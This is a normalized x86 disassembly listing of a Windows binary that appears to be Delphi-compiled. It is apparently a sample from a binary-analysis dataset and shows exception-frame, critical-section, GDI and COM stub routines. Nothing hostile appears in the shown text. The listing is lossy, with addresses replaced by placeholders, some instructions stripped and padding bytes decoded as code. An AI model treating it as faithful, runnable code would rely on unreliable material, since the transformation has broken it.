call sub_41e304
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41e53f
jmp sub_403b24
sub_41e546
mov esp ebp
pop ebp
retn
sub_41e5f0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
retn
sub_41e678
mov [ eax + 0x18 ] edx
retn
sub_41e680
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_41e7f4
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_4176fc
retn
sub_41e87b
jmp sub_403b24
sub_41e882
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41e92e
jmp sub_403b24
sub_41e935
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ead9
jmp sub_403b24
sub_41eb2b
jmp sub_403b24
sub_41eb4a
jmp sub_403b24
sub_41eb51
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb70
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41eb69
jmp sub_403b24
sub_41eb70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ec13
jmp sub_403b24
sub_41ec9b
jmp sub_403b24
sub_41eca8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
pop ebx
retn
sub_41ecc0
mov eax [ rw-data ]
call sub_41eca8
retn
sub_41ecf8
push ebx
call sub_4174f8
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41ecc0
sub_41ee65
jmp sub_403b24
sub_41ee6c
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404120
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41ef8c
jmp sub_403b24
sub_41ef93
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41f08a
jmp sub_403b24
sub_41f0a7
jmp sub_403b24
sub_41f0ae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f1ac
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41dba4
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41f270
push ebx
mov ebx eax
mov eax ebx
call sub_420c24
cmp al 0x9
sete al
pop ebx
retn
sub_41f2cf
jmp sub_403b24
sub_41f2d6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41f37c
jmp sub_403b24
sub_41f383
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f602
jmp sub_403870
sub_41f62e
jmp sub_403870
sub_41f6d0
jmp sub_403870
sub_41f773
jmp sub_403870
sub_41f94b
jmp sub_403870
sub_41f98d
jmp sub_403b24
sub_41f9bd
jmp sub_403b24
sub_41f9c4
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fa33
jmp sub_403b24
sub_41fb0a
jmp sub_403b24
sub_41fb11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fde4
mov dl 0x1
call sub_41ed4c
retn
sub_41ff25
jmp sub_403b24
sub_41ff2c
pop ebx
mov esp ebp
pop ebp
retn
sub_41ff34
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_420d34
mov eax [ rw-data ]
call sub_41eca8
pop ebp
retn
j_sub_40399c#3
jmp sub_40399c
j_sub_40399c#5
jmp sub_40399c
sub_420120
jmp sub_403b24
sub_420127
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420207
jmp sub_403b24
sub_42020e
mov esp ebp
pop ebp
retn
sub_4202c6
jmp sub_403b24
sub_4202cd
pop ecx
pop ecx
pop ebp
retn
sub_4205cf
jmp sub_403b24
sub_4205d6
pop ebx
mov esp ebp
pop ebp
retn
sub_42087b
jmp sub_403b24
sub_420882
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403390
retn
sub_42089b
jmp sub_403b24
sub_4208bf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403870
sub_4208f6
jmp sub_403870
sub_420935
jmp sub_403b24
sub_42093c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42095e
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_404144
retn
sub_420957
jmp sub_403b24
sub_42095e
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4209e5
jmp sub_403870
sub_420a12
jmp sub_403b24
sub_420a19
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420a24
push ecx
mov edx esp
mov ecx 0x4
call sub_41f1e8
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41eca8
sub_420b31
jmp sub_403b24
sub_420b38
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420c17
jmp sub_403b24
sub_420c1e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420c74
jmp sub_403b24
sub_420c7b
pop ebx
pop ecx
pop ebp
retn
sub_420ec3
jmp sub_403b24
sub_420eca
pop ecx
pop ecx
pop ebp
retn
sub_420f0d
jmp sub_403b24
sub_420f14
pop ebx
pop ecx
pop ebp
retn
sub_420fb0
jmp sub_403b24
sub_420fb7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421065
jmp sub_403b24
sub_42106c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421078
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4212d3
jmp sub_403b24
sub_4212da
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212ff
mov eax [ ebp - 0x8 ]
call sub_403390
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_4212f8
jmp sub_403b24
sub_4212ff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421324
lea eax [ ebp - 0x1c ]
call sub_405b50
lea eax [ ebp - 0x18 ]
call sub_404120
retn
sub_42131d
jmp sub_403b24
sub_421324
pop ebx
mov esp ebp
pop ebp
retn
sub_421536
jmp sub_403b24
sub_42153d
pop ebx
mov esp ebp
pop ebp
retn
sub_421570
mov eax [ eax + 0x30 ]
call sub_41b4f8
retn
sub_4215e0
call sub_421710
retn
sub_421624
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41e678
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_4216ff
jmp sub_403b24
sub_421706
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_421710
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41de08
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_421728
test dl dl
je r-xdata
mov dl 0x8
call sub_42385c
retn
mov dl 0x9
call sub_42385c
retn
sub_42177f
jmp sub_403b24
sub_421786
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42181e
jmp sub_403b24
sub_421825
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4219c3
jmp sub_403b24
sub_4219ca
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421d0b
jmp sub_403b24
sub_421d4d
jmp sub_403b24
sub_421dac
jmp sub_403b24
sub_421db3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421ff0
mov dl 0x1
call sub_42385c
retn
sub_421ff8
xor edx edx
call sub_42385c
retn
sub_4220f1
jmp sub_403b24
sub_4222c7
jmp sub_403b24
sub_4222ce
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42249c
jmp sub_403b24
sub_4224a3
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422579
jmp sub_403b24
sub_422580
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_422697
jmp sub_403b24
sub_42269e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_422858
jmp sub_403b24
sub_42285f
pop ecx
pop ebp
retn
sub_4228ea
jmp sub_403b24
sub_4228f1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422958
jmp sub_403b24
sub_42295f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4229dd
jmp sub_403b24
sub_4229e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422a01
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_4229fa
jmp sub_403b24
sub_422a01
pop ebx
pop ecx
pop ebp
retn
sub_422abc
jmp sub_403b24
sub_422ac3
pop ebx
pop ecx
pop ebp
retn
sub_422b99
jmp sub_403b24
sub_422ba0
pop ecx
pop ebp
retn
sub_422ba4
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_422cab
jmp sub_403b24
sub_422cb2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422e59
jmp sub_403b24
sub_422ed8
jmp sub_403b24
sub_422edf
mov esp ebp
pop ebp
retn
sub_422fad
jmp sub_403b24
sub_422fb4
pop ebx
mov esp ebp
pop ebp
retn
sub_423067
jmp sub_403b24
sub_42306e
pop ebx
mov esp ebp
pop ebp
retn
sub_4230cd
jmp sub_403b24
sub_4230d4
mov esp ebp
pop ebp
retn
sub_423539
jmp sub_403b24
sub_423593
jmp sub_403b24
sub_4235a4
jmp sub_403870
sub_423600
jmp sub_403b24
sub_423607
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423666
jmp sub_403b24
sub_42366d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423799
jmp sub_403b24
sub_4237a0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42384e
jmp sub_403b24
sub_423855
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423894
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40d244
sub_4238c8
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_4238e0
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_4238ec
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_4238e0
sub_423a12
jmp sub_403870
sub_423a41
jmp sub_403b24
sub_423a77
jmp sub_403b24
sub_423a7e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a9d
push rw-data
call LeaveCriticalSection
retn
sub_423a96
jmp sub_403b24
sub_423a9d
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423b6c
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_423d48
sub_423bcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41fd34
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_423be0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41fd34
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_423bf4
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_421f24
retn
sub_423c00
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_421f24
retn
sub_423ea8
xor eax eax
retn
sub_423eac
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_423eb4
xor eax eax
retn
sub_423eb8
retn
sub_423ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404174
pop esi
pop ebx
retn
sub_423ed0
mov eax [ eax + 0x4 ]
retn
sub_423ed4
retn
sub_423ed8
xor eax eax
retn
sub_423edc
retn
sub_423ee0
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_423eec
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_423ef8
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_423f04
retn
sub_423f08
xchg edx eax
call sub_41f9d8
retn
sub_423f10
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_423f98
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_40358c
pop esi
retn
sub_423fac
retn
sub_42408c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404174
pop esi
pop ebx
retn
sub_4240cc
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_424218
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4035d8
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_424230
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_4242b8
retn
sub_424300
retn
sub_424338
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_424350
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_424574
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_40358c
pop esi
pop ebx
retn
sub_424398
mov al 0x1
retn
sub_42439c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4243a4
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_42444c
xor eax eax
retn
sub_424450
retn
sub_42447c
retn
sub_424514
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_424528
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_41b4f8
retn
sub_42466f
jmp sub_403870
sub_424674
mov ebx 0x1
call sub_403bd8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4246d7
jmp sub_403870
sub_4246dc
mov ebx 0x80030103
call sub_403bd8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42475a
jmp sub_403870
sub_42475f
mov ebx 0x80030009
call sub_403bd8
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_4247bd
jmp sub_403870
sub_4247c2
mov ebx 0x8000ffff
call sub_403bd8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42498d
jmp sub_403b24
sub_42499e
jmp sub_403870
sub_4249a3
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4249cc
lea eax [ ebp + 0xc ]
call sub_405b50
retn
sub_4249c5
jmp sub_403b24
sub_4249cc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_4249d8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4249e4
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_4249f0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_4249fc
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_424a6b
jmp sub_403870
sub_424a70
mov esi 0x8000ffff
call sub_403bd8
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_424a84
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_424af1
jmp sub_403b24
sub_424af8
mov eax [ rw-data ]
call sub_403390
pop edi
pop esi
pop ebx
pop ebp
retn
sub_424b08
call sub_41ac3c
retn
sub_424bd0
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_424d74
jmp sub_403b24
sub_424d7b
pop ebp
retn
sub_424e09
jmp sub_403b24
sub_424e10
pop ebp
retn
sub_4250f1
jmp sub_403b24
sub_4250f8
pop ebp
retn
sub_4250fc
sub [ rw-data ] 0x1
retn
sub_4260ac
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_426120
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_426194
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4261a0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_426280
jmp sub_403b24
sub_426287
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426317
jmp sub_403b24
sub_4263a9
jmp sub_403b24
sub_4263b0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426414
jmp sub_403b24
sub_42641b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_426483
jmp sub_403b24
sub_42648a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42652d
jmp sub_403b24
sub_426534
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42698c
push 0x33
mov ecx rw-data
call sub_41af78
retn
sub_42699c
push 0x33
mov ecx rw-data
call sub_41af38
retn
sub_4269ac
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4269d0
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_426ba4
push 0x11
mov ecx rw-data
call sub_41af38
retn
sub_426ce4
push ebx
mov ebx eax
mov eax ebx
call sub_4269ac
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_426d9e
jmp sub_403b24
sub_426da5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4269d0
retn
sub_426dbb
jmp sub_403b24
sub_426dd4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_426e31
jmp sub_403b24
sub_426e38
pop ebx
pop ecx
pop ebp
retn
sub_426fb1
jmp sub_403b24
sub_426fd9
jmp sub_403b24
sub_426fe0
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_42704c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404384
pop esi
pop ebx
retn
sub_4270c0
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_42701c
push eax
call MulDiv
neg eax
pop ebx
retn
sub_427134
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_427164
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_427282
jmp sub_403b24
sub_427289
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4269d0
retn
sub_42729f
jmp sub_403b24
sub_427315
jmp sub_403b24
sub_42731c
pop ebx
pop ecx
pop ebp
retn
sub_427320
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_4273d6
jmp sub_403b24
sub_4273fc
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_42742c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_42753b
jmp sub_403b24
sub_427542
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4269d0
retn
sub_427558
jmp sub_403b24
sub_4275d1
jmp sub_403b24
sub_4275d8
pop ebx
pop ecx
pop ebp
retn
sub_427709
jmp sub_403b24
sub_42771c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_427a5c
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_427c38
jmp sub_403b24
sub_427c3f
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_427c48
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_427c80
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_427c8c
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_427dcc
retn
sub_427e95
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_427eac
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_427f98
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_427fb8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_427fd8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_427ff8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
pop ebx
retn
sub_428010
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
pop ebx
retn
sub_428034
mov eax [ rw-data ]
call sub_428010
retn
sub_428096
jmp sub_403b24
sub_42809d
pop ecx
pop ebp
retn
sub_42813c
jmp sub_403b24
sub_428143
pop ebx
mov esp ebp
pop ebp
retn
sub_428215
jmp sub_403b24
sub_4282a6
jmp sub_403b24
sub_4282ad
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4282d8
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_4283bf
jmp sub_403b24
sub_42856c
jmp sub_403b24
sub_428573
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_428785
jmp sub_403b24
sub_42878c
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_428826
jmp sub_403b24
sub_428a02
jmp sub_403b24
sub_428abc
jmp sub_403b24
sub_428ac3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428ae3
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_428adc
jmp sub_403b24
sub_428ae3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428c71
jmp sub_403b24
sub_428e3c
jmp sub_403b24
sub_428e43
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428e66
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4027d4
retn
sub_428e5f
jmp sub_403b24
sub_428e66
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428e86
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4027d4
retn
sub_428e7f
jmp sub_403b24
sub_428e86
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_428e90
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_428ff0
push 0x0
call sub_428f8c
retn
sub_429095
jmp sub_403b24
sub_42909c
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4290a8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_428ff8
pop ebx
pop ebp
retn 0x4
sub_4290bc
retn
sub_4290c0
test eax eax
jne r-xdata
retn
call sub_4290bc
sub_429293
jmp sub_403b24
sub_4292ba
jmp sub_403b24
sub_4292c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429300
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_4294cd
mov eax [ ebp - 0xc ]
call sub_403390
retn
sub_4294d6
jmp sub_403b24
j_sub_4294cd
jmp sub_4294cd
sub_4294dd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403390
retn
sub_4294f3
jmp sub_403b24
sub_429504
xor eax eax
retn
sub_429508
mov al [ eax + 0x21 ]
retn
sub_429554
jmp sub_403b24
sub_42955b
pop esi
pop ecx
pop ebp
retn
sub_429588
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_4295df
jmp sub_403b24
sub_4295e6
pop esi
pop ecx
pop ebp
retn
sub_4295ec
retn
sub_4295f0
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429600
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_429785
jmp sub_403b24
sub_42978c
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4298ab
jmp sub_403b24
sub_4298b2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42993a
jmp sub_403b24
sub_429941
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429a9c
jmp sub_403870
sub_429ac0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4296a8
mov [ rw-data ] eax
sub_429ae0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4299ac
mov [ rw-data ] eax
sub_429c08
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_429ba4
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_429c20
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_429ba4
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_429c38
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_429ba4
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_429ce0
jmp sub_403870
sub_429d00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_429c08
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_429d18
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_429c08
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_429e85
jmp sub_403870
sub_429f03
jmp sub_403b24
sub_429f0a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a038
xor edx edx
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx eax
sub_42a050
xor edx edx
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx eax
sub_42a0a4
retn
sub_42a118
jmp sub_403b24
sub_42a32f
jmp sub_403b24
sub_42a336
